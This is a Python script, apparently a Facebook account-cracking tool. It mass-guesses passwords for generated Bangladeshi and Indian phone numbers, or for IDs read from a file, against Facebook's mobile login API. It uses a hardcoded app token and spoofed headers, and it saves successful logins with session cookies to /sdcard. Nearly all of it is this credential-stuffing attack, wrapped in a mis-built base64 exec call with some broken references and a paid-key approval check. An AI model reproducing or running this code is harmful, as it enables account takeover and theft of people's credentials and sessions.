# Compiled By Mr Mafia | Muhammad Muzammil
# Github  :  https://github.com/Muzammil-404

import base64
exec(base64.b64decode("#__________________[ IMPORT ]__________________#
import os,zlib
from os import system as osRUB
from os import system as cmd
os.system('clear')
print(f'\x1b[38;5;46m𓆩\x1b[1;97m●\x1b[38;5;46m𓆪  WELCOME TO KHAlïl TOOL FREE TRAI ')
try:
    import requests 
except ImportError:
    print(f'\x1b[38;5;46m[\x1b𓆩1;97m●\x1b[38;5;46m𓆪 INSTALLING REQUESTS ')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print(f'\x1b[38;5;46m[\x1b𓆩1;97m●\x1b[38;5;46m𓆪 INSTALLING FUTURES ')
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as Habib
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#__________________[ LOOP ]__________________#
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; swag\x07')
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________[ LINEX ]__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m𓆩♡𓆪\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
#__________________[ LOGO ]__________________#
logo =f"""{A}
_   ___           _ _ _
| | / / |         | (_) | 
| |/ /| |__   __ _| |_| | 
|    \| '_ \ / _` | | | | 
| |\  \ | | | (_| | | | | 
\_| \_/_| |_|\__,_|_|_|_| 
\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m𓆩♡𓆪\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
{B}𓆩{A}●{B}𓆪{G}FACEBOK \033[1;37m: 𝐊𝐇𝐀𝐥ï𝐥 
{B}𓆩{A}●{B}𓆪{G}GITHUB  \033[1;37m: 𝐌𝟏𝟔
{B}𓆩{A}●{B}𓆪{G}SERVICE \033[1;37m: 𝐏𝐀𝐈𝐃
{B}𓆩{A}●{B}𓆪{G}VERSION \033[1;37m: 𝟒.𝟏
\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m𓆩♡𓆪\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
#__________________[ RESULT ]__________________#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m𓆩♡𓆪\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        print(f'{B}𓆩{A}●{B}𓆪{G} THE PROCESS HAS BEEN COMPLETE...')
        print(f'{B}𓆩{A}●{B}𓆪{G} TOTAL OK {A}:{G2} %s' % str(len(oks)))
        print(f'{B}𓆩{A}●{B}𓆪{G} TOTAL CP {A}:{G3} %s' % str(len(cps)))
        print(f'\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m𓆩♡𓆪\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        input(f"{G1}𓆩{A}●{G4}𓆪{G4} PRESS ENTER TO BACK MENU ")
        exit()
#__________________[ MENU ]__________________#
def menu():   
    clear()
    print(f'{B}𓆩{A}1{B}𓆪{G} FILE CRACK \n{B}𓆩{A}2{B}𓆪{G} RANDOM CRACK\n{B}𓆩{A}3{B}𓆪{G} UNBLUCK IP\n{B}𓆩{A}0{B}𓆪{G} EXIT TOOL')
    linex()
    select = xd=input(f'{B}𓆩{A}?{B}𓆪{G} CHOICE : ')
    if select =='1':
        _file_()
    elif select =='2':
        _randm_()
    elif select =='3':
        os.system('xdg-open https://www.facebook.com/sk.sahathat');menu()
    elif select =='0':
        exit(f'{B}𓆩{A}●{B}𓆪{G} EXIT DONE ')
    else:
        print(f'{B}𓆩{A}●{B}𓆪{G} VALID OPTION')
        time.sleep(2)
        menu()
#__________________[ RANDOM ]__________________#      
def _randm_():   
    clear()
    print(f'{B}𓆩{A}●{B}𓆪{G} BANGLADESH CLONING')
    print(f'{B}𓆩{A}●{B}𓆪{G} INDIA CLONING')
    print(f'{B}𓆩{A}0{B}𓆪{G} BACK TO MAIN MENU')
    linex()
    select = input(f'{B}𓆩{A}●{B}𓆪{G} CHOICE {A}:{G5} ')
    if select =='1':
        _bd_()
    elif select =='2':
        _India_()
    elif select =='0':
    	menu()
    else:
        print(f'{B}𓆩{A}●{B}𓆪{G} VALID OPTION')
        time.sleep(2)
        _randm_()
#__________________[ BANGLADESH ]__________________#
def _bd_():
    clear()
    print(f'{B}𓆩{A}●{B}𓆪{G} EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016');linex()
    code = input(f'{B}𓆩{A}●{B}𓆪{G} CHOICE  {A}:{G2} ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'{B}𓆩{A}●{B}𓆪{G} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
    limit = int(input(f'{B}𓆩{A}●{B}𓆪{G} CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'{B}𓆩{A}●{B}𓆪{G} SIM CODE  {A}:{G1} {code}')
        print(f'{B}𓆩{A}●{B}𓆪{G} TOTAL UID {A}:{G2} {str(len(user))}')
        print(f'{B}𓆩{A}●{B}𓆪{G} TURN {G3}𓆩{A}ON{A}/{A}OFF{G3}𓆪{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{B}𓆩{A}●{B}𓆪{G} THE PROCESS HAS BEEN COMPLETED')
    print(f'{B}𓆩{A}●{B}𓆪{G} TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{B}𓆩{A}●{B}𓆪{G} TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{B}𓆩{A}●{B}𓆪{G} PRESS ENTER TO BACK ')
    menu()
#__________________[ INDIA ]__________________#
def _India_():
    clear()
    print(f'{B}𓆩{A}●{B}𓆪{G} EXAMPLE {A}:{G1} +91639{A}/{G1}+91934{A}/{G1}+91902{A}/{G1}+91701');linex()
    code = input(f'{B}𓆩{A}●{B}𓆪{G} CHOICE  {A}:{G2} ')
    clear()
    print(f'{B}𓆩{A}●{B}𓆪{G}EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
    limit = int(input(f'{B}𓆩{A}●{B}𓆪{G} CHOICE  {A}:{G4} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'{B}𓆩{A}●{B}𓆪{G} TOTAL ACCOUNT :{A} '+total_ids+f' {G}<{A}-{G}> METHOD :{A} M{mthd}')
        print(f'{B}𓆩{A}●{B}𓆪{G} USE FLIGHT MODE FOR SPEED UP')
        for love in user:
            ids = code+love
            psd = [love,ids[:8],'57273200','59039200','57575751']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{B}𓆩{A}●{B}𓆪{G} THE PROCESS HAS BEEN COMPLETED')
    print(f'{B}𓆩{A}●{B}𓆪{G} TOTAL OK ID {A}:{G2} {str(len(ok))}')
    print(f'{B}𓆩{A}●{B}𓆪{G} TOTAL CP ID {A}:{G3} {str(len(cp))}')
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{B}𓆩{A}●{B}𓆪{G} PRESS ENTER TO BACK ')
    menu()
#__________________[ FILE ]__________________#      
def _file_():
    global methods
    clear()
    print(f'{B}𓆩{A}1{B}𓆪{G} METHOD {B}❲{A}M1{B}❳\n{B}𓆩{A}2{B}𓆪{G} METHOD {B}❲{A}M2{B}❳\n{B}𓆩{A}3{B}𓆪{G} METHOD {B}❲{A}M3{B}❳');linex()
    linex()
    option = xd=input(f'{B}𓆩{A}?{B}𓆪{G} CHOICE : ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='0':
        _file_()
    else:
      print(f'{B}𓆩{A}●{B}𓆪{G} VALID OPTION')
      time.sleep(2)
      _file_()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print(f'{B}𓆩{A}●{B}𓆪{G} EXAMPLE : /sdcard/KHAlïl.txt ');linex()
        self.file = xd=input(f'{B}𓆩{A}?{B}𓆪{G} FILE NAME {A}:{G2} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{B}𓆩{A}●{B}𓆪{G} OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'{B}𓆩{A}●{B}𓆪{G} TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'Dalvik/2.1.0 (Linux;  U; Android 5.0.1; SM-A205YN Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.75,width=1312,height=2132};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205YN;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"Dalvik/2.1.0 (Linux;  U; Android 6.0.1; SM-A205S Build/SKQ1.210216.001) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3 75,width=878,height=1699};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205S;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"Dalvik/2.1.0 (Linux;  U; Android 5.0.1; SM-A205U Build/RKQ1.211103.002) [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3 75,width=1114,height=1372};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            sys.stdout.write(f'\r\r{B}𓆩{G}KHAlïl-M1{B}𓆪{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f"\r\r{G1}𓆩KHAlïl-OK𓆪 {sid} | {ps} ")
                    open('/sdcard/KHAlïl-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}𓆩KHAlïl-CP𓆪 {sid} | {ps} ")
                     open('/sdcard/KHAlïl-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r{B}𓆩{G}KHAlïl-M2{B}𓆪{G} %s {B}|{G} OK{B}|{G}CP{G} %s{B}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': '[FBAN/;FBAV/YZWSES93;FBBV/640730667;FBAN/FBAN;FBAV/YZWSES93;FBBV/640730667;FBDM//*{density=2.0,width=1080,height=3840};FBLC/ja_JP;FBRV/793176953;FBCR/Nokia;FBMF/VIVO;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12T Pro;FBSV/11;FBOP/5;FBCA/armeabi-v7a;FBSS/10;]',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);swagb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={swagb};{ckkk}"
                    print(f"\r\r{G1}❲KHAlïl-OK❳ {sid} | {ps} ")
                    open('/sdcard/KHAlïl-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}❲KHAlïl-CP❳ {sid} | {ps} ")
                    open('/sdcard/KHAlïl-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f'{B}𓆩{A}●{B}𓆪{G} EXAMPLE {A}:{G2} ❲10=15❳ ');linex()
            sl = int(input(f'{B}𓆩{A}●{B}𓆪{G} PASSWORD LIMIT : '))
            clear()
            print(f'{B}𓆩{A}●{B}𓆪{G} EXAMPLE : first first{B}/{G}last last{B}/{G}first123 ')
            linex()
            if sl =='':
                print(input(f'{B}𓆩{A}●{B}𓆪{G} PASSWORD NO {i+1} :{A} '))
            elif sl > 20:
                print(f'{G1}𓆩{A}●{G1}𓆪{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'{G1}𓆩{A}={G1}𓆪{G1} PASSWORD NO {G1}𓆩{A}{sr+1}{G1}𓆪 {A}:{G1} '))
            clear()
            print(f'{B}𓆩{A}●{B}𓆪{G} TOTAL FILE UID {A}:{G1} %s ' % len(self.id))
            print(f'{B}𓆩{A}●{B}𓆪{G} PASSWORD LIMIT {A}:{G1} {sl} ')
            print(f'{B}𓆩{A}●{B}𓆪{G} TURN {G3}𓆩{A}ON{A}/{A}OFF{G3}𓆪{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
            linex()
            with Habib(max_workers=30) as swagworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                swagworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                swagworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
#__________________[ RANDOM METHOD ]__________________#
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}𓆩{A}KHAlïl-XD{G1}𓆪{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/;FBAV/4Q095MQG;FBBV/802090752;FBAN/FBAN;FBAV/4Q095MQG;FBBV/802090752;FBDM//*{density=2.0,width=720,height=1920};FBLC/ru_RU;FBRV/272880817;FBCR/Realme;FBMF/Apple;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Poco_F3;FBSV/12;FBOP/4;FBCA/arm64-v8a;FBSS/15;]',
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f'\r\r{G1}𓆩KHAlïl𓆪-OK {uid} | {pas}')
                #print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/KHAlïl-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________[ END ]__________________#
def main_apv():
    imt = '578'
    os.system('clear')
    print(logo)
    try:
        key1 = open('/sdcard/.HExX.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
       
        myid = uuid.uuid4().hex[:30]
        
        kok = open('/sdcard/.HExX.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python KHAlïl.py')
        tks = ('Hello%20HExX%20Owner%20Abdou%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+?text='+tks)

    r1 = requests.get('https://github.com/ZERO-69/approve.txt/blob/main/approve.txt').text
   
    if key1 in r1:
        menu()
    else:
        os.system('clear')
        print(logo)
        print(' \033[1;37mKey : \033[1;32m' + key1)
        linex()
        print (' \033[1;37mThis Tool is Paid So Need Get Approval') 
       
        #print(' Payment Number Details\n 03239021979 \n Easypaisa or Jazzcash');linex()
        input(' \033[1;37mPress Enter To send key Admin')
        tks = ('Hello%20HExX%20Owner%20HExX-XD%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi'+tks)
        main_apv() 
main_apv()"))